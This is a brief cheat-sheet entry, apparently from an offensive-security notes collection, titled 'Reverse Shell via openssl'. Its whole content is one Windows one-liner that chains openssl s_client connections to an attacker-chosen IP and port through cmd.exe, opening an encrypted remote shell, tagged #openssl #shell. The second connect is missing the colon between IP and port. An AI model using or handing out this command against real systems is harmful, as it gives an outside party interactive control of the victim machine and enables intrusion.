# (Reverse-) Shell via openssl

```bash cheat openssl openssl (reverse) shell
openssl.exe s_client -quiet -connect <ip>:<port> | cmd.exe | openssl.exe s_client -quiet -connect <ip><port>
```

tags: #openssl #shell 
